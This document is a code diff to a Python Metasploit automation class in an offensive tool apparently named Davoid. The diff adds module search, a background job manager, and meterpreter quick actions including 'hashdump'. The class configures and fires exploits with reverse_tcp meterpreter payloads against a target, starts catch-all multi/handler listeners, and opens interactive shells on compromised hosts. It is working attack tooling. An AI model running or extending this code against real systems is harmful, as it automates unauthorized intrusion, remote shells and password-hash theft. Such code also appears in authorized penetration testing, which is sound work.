@@ -72,7 +72,6 @@ class MetasploitRPCEngine:
 
     def is_port_open(self, port):
         """Checks if a local port is listening."""
-        # FIXED: Corrected socket.STREAM to socket.SOCK_STREAM
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             return s.connect_ex(('127.0.0.1', port)) == 0
 
@@ -96,10 +95,8 @@ class MetasploitRPCEngine:
             self.daemon_process = subprocess.Popen(
                 cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-            # Wait for the daemon to finish initializing and load its massive Ruby framework
             for _ in range(40):
                 if self.is_port_open(self.rpc_port):
-                    # Give it a 3-second buffer to finalize loading modules
                     time.sleep(3)
                     return True
                 time.sleep(1)
@@ -128,6 +125,38 @@ class MetasploitRPCEngine:
             console.print(
                 f"[bold red][!] RPC Connection Failed:[/bold red] {e}")
             return False
+
+    def search_modules(self):
+        """Pro Feature: Search Metasploit database from within Davoid."""
+        keyword = questionary.text(
+            "Enter search keyword (e.g., vsftpd, eternalblue, smb):", style=Q_STYLE).ask()
+        if not keyword:
+            return
+
+        with console.status(f"[bold cyan]Querying Metasploit Database for '{keyword}'...[/bold cyan]", spinner="dots"):
+            try:
+                msf_console = self.client.consoles.console()
+                msf_console.write(f"search {keyword}\n")
+
+                # Buffer time for the massive search query
+                time.sleep(3)
+                output = msf_console.read()
+
+                if output and output.get('data'):
+                    data = output['data']
+                    # Strip the extreme length of default msfconsole output to keep it clean
+                    lines = data.split('\n')
+                    if len(lines) > 50:
+                        data = '\n'.join(
+                            lines[:50]) + "\n\n... [Truncated for readability. Be more specific.]"
+
+                    console.print(
+                        Panel(data, title=f"Search Results: {keyword}", border_style="cyan"))
+                else:
+                    console.print(
+                        "[yellow][!] No modules found or search timed out.[/yellow]")
+            except Exception as e:
+                console.print(f"[red][!] Search failed: {e}[/red]")
 
     def auto_exploit(self):
         """Silently configures and launches an exploit via Virtual Console API."""
@@ -162,12 +191,10 @@ class MetasploitRPCEngine:
         if not custom_mod:
             return
 
-        # Smart default payload guessing based on the module
         default_payload = "windows/x64/meterpreter/reverse_tcp"
         if "unix" in custom_mod or "linux" in custom_mod or "apache" in custom_mod:
             default_payload = "cmd/unix/interact"
 
-        # Interactive Dropdown Menu for Payloads
         payload_choices = [
             "windows/x64/meterpreter/reverse_tcp",
             "windows/meterpreter/reverse_tcp",
@@ -199,24 +226,18 @@ class MetasploitRPCEngine:
             f"[bold cyan]Deploying Exploit via Virtual Console API...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {custom_mod}", border_style="red"))
 
         try:
-            # Using the Virtual Console API natively bypasses the pymetasploit3 crash bugs
             msf_console = self.client.consoles.console()
 
             msf_console.write(f"use {custom_mod}\n")
             time.sleep(0.5)
 
-            # Use SETG (Set Global) to silently force variables into the MSF memory space.
-            # This completely bypasses the "Unknown datastore option" errors if a module
-            # (like vsftpd) doesn't use LHOST/LPORT!
             msf_console.write(f"setg RHOSTS {target}\n")
             msf_console.write(f"setg RHOST {target}\n")
             msf_console.write(f"setg RPORT {rport}\n")
             msf_console.write(f"setg LHOST {lhost}\n")
             msf_console.write(f"setg LPORT 4444\n")
-
             msf_console.write(f"set PAYLOAD {custom_payload}\n")
 
-            # Smart Exploit Detection: Check if it's a local exploit that needs a session
             if "local" in custom_mod or "pe_injection" in custom_mod:
                 console.print(
                     "\n[yellow][!] This appears to be a Local Privilege Escalation exploit.[/yellow]")
@@ -225,29 +246,24 @@ class MetasploitRPCEngine:
                 if sess_id:
                     msf_console.write(f"set SESSION {sess_id}\n")
 
-            # -z runs the exploit and backgrounds the session cleanly, preventing dropped connections
             msf_console.write("exploit -z\n")
 
             db.log("MSF-Engine", target,
                    f"Attempted {custom_mod} via Console", "INFO")
 
-            # Read the MSF console stream to catch exact failure/success messages
             console_output = ""
             with console.status("[bold cyan]Executing and capturing MSF output...[/bold cyan]", spinner="dots"):
-                # Poll for up to 15 seconds (10 iterations * 1.5s)
                 for _ in range(10):
                     time.sleep(1.5)
                     out = msf_console.read()
                     if out and out.get('data'):
                         console_output += out['data']
-                        # Break early if the exploit finishes successfully or fails explicitly
                         if any(x in out['data'] for x in ["Exploit completed", "session", "failed", "Command shell", "found"]):
                             break
 
             if console_output.strip():
                 console.print(f"\n[dim]{console_output.strip()}[/dim]")
 
-            # Smart Wait Loop for Session Hooking
             with console.status("[bold cyan]Verifying session status...[/bold cyan]", spinner="bouncingBar"):
                 session_found = False
                 for _ in range(4):
@@ -255,7 +271,7 @@ class MetasploitRPCEngine:
                     sessions = self.client.sessions.list
                     if sessions:
                         console.print(
-                            f"\n[bold green][+] Success! {len(sessions)} session(s) active. Use Option 3 to interact.[/bold green]")
+                            f"\n[bold green][+] Success! {len(sessions)} session(s) active. Use Option 4 to interact.[/bold green]")
                         db.log("MSF-Engine", target,
                                f"Successful Exploit: {custom_mod}", "CRITICAL")
                         session_found = True
@@ -275,10 +291,11 @@ class MetasploitRPCEngine:
 
         if not sessions:
             console.print("[yellow][!] No active MSF sessions found.[/yellow]")
-            return
+            return False
 
-        table = Table(title="Active MSF Sessions (RPC)", border_style="green")
-        table.add_column("Session ID", style="cyan")
+        table = Table(title="Active MSF Sessions (RPC)",
+                      border_style="green", expand=True)
+        table.add_column("ID", style="cyan", justify="center")
         table.add_column("Type", style="magenta")
         table.add_column("Target IP", style="white")
         table.add_column("Details", style="dim")
@@ -292,29 +309,74 @@ class MetasploitRPCEngine:
             )
 
         console.print(table)
+        return True
+
+    def manage_jobs(self):
+        """Pro Feature: Background Job Manager"""
+        jobs = self.client.jobs.list
+        if not jobs:
+            console.print("[yellow][!] No background jobs running.[/yellow]")
+            return
+
+        table = Table(title="Active MSF Background Jobs",
+                      border_style="blue", expand=True)
+        table.add_column("Job ID", style="cyan", justify="center")
+        table.add_column("Job Name", style="white")
+
+        for jid, jname in jobs.items():
+            table.add_row(str(jid), jname)
+
+        console.print(table)
+
+        target_job = questionary.text(
+            "Enter Job ID to kill (or leave blank to cancel):", style=Q_STYLE).ask()
+        if target_job and target_job in jobs:
+            try:
+                self.client.jobs.stop(target_job)
+                console.print(
+                    f"[bold green][+] Job {target_job} terminated successfully.[/bold green]")
+            except Exception as e:
+                console.print(f"[red][!] Failed to kill job: {e}[/red]")
 
     def interact_session(self):
         """Opens an interactive terminal to an active Metasploit session."""
-        sessions = self.client.sessions.list
-
-        if not sessions:
-            console.print(
-                "[yellow][!] No active MSF sessions found. Exploit a target first.[/yellow]")
+        if not self.list_sessions():
             return
 
-        self.list_sessions()
         session_id = questionary.text(
             "Enter Session ID to interact with (or leave blank to cancel):", style=Q_STYLE).ask()
 
         if not session_id:
             return
 
+        sessions = self.client.sessions.list
         if session_id not in sessions:
             console.print("[bold red][!] Invalid Session ID.[/bold red]")
             return
 
         session_type = sessions[session_id].get('type', 'Unknown')
         shell = self.client.sessions.session(session_id)
+
+        # Pro Feature: Automated Post-Exploitation Quick Actions
+        if session_type == 'meterpreter':
+            quick_action = questionary.select(
+                "Meterpreter Quick Actions:",
+                choices=[
+                    "1. Drop into Interactive Shell",
+                    "2. Run 'sysinfo' and 'getuid'",
+                    "3. Attempt Hashdump"
+                ],
+                style=Q_STYLE
+            ).ask()
+
+            if quick_action and "sysinfo" in quick_action:
+                console.print("[cyan][*] Gathering system info...[/cyan]")
+                console.print(shell.run_with_output('sysinfo'))
+                console.print(shell.run_with_output('getuid'))
+            elif quick_action and "Hashdump" in quick_action:
+                console.print(
+                    "[cyan][*] Attempting to dump password hashes...[/cyan]")
+                console.print(shell.run_with_output('hashdump'))
 
         console.print(Panel(
             f"[bold green][+] Interacting with {session_type.capitalize()} Session {session_id}[/bold green]\n"
@@ -332,14 +394,13 @@ class MetasploitRPCEngine:
                 if cmd.lower() in ['exit', 'quit', 'background']:
                     break
 
-                # Meterpreter and standard shells use different execution methods in PyMetasploit3
                 if session_type == 'meterpreter':
                     output = shell.run_with_output(cmd)
                     if output:
                         console.print(f"[white]{output}[/white]")
                 else:
                     shell.write(cmd + '\n')
-                    time.sleep(1.5)  # Buffer time for the shell to process
+                    time.sleep(1.5)
                     output = shell.read()
                     if output:
                         console.print(f"[white]{output}[/white]")
@@ -378,9 +439,10 @@ class MetasploitRPCEngine:
                     "MSF-RPC Operations:",
                     choices=[
                         "1. Auto-Exploit Target",
-                        "2. List Active Sessions",
-                        "3. Interact with Active Session (Terminal)",
-                        "4. Start Generic Catch-All Listener (Multi/Handler)",
+                        "2. Search MSF Modules (Exploit Database)",
+                        "3. Start Generic Catch-All Listener (Multi/Handler)",
+                        "4. Active Sessions & Post-Exploitation",
+                        "5. Manage Background Jobs",
                         "Back"
                     ], style=Q_STYLE
                 ).ask()
@@ -390,11 +452,14 @@ class MetasploitRPCEngine:
                 elif "Auto-Exploit" in choice:
                     self.auto_exploit()
                     questionary.press_any_key_to_continue(style=Q_STYLE).ask()
-                elif "List Active" in choice:
-                    self.list_sessions()
+                elif "Search MSF" in choice:
+                    self.search_modules()
                     questionary.press_any_key_to_continue(style=Q_STYLE).ask()
-                elif "Interact with Active Session" in choice:
+                elif "Active Sessions" in choice:
                     self.interact_session()
+                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+                elif "Manage Background" in choice:
+                    self.manage_jobs()
                     questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                 elif "Listener" in choice:
                     lhost = ctx.get("LHOST") or "0.0.0.0"
@@ -430,13 +495,12 @@ class MetasploitRPCEngine:
                         msf_console.write("use exploit/multi/handler\n")
                         msf_console.write(f"set PAYLOAD {payload}\n")
 
-                        # Use SETG for the listener as well
                         msf_console.write(f"setg LHOST {lhost}\n")
                         msf_console.write(f"setg LPORT {lport}\n")
                         msf_console.write("exploit -j -z\n")
 
                         console.print(
-                            "[bold green][+] Listener started in background.[/bold green]")
+                            "[bold green][+] Listener started in background (Check Jobs menu).[/bold green]")
 
                         time.sleep(2)
                         output = msf_console.read()
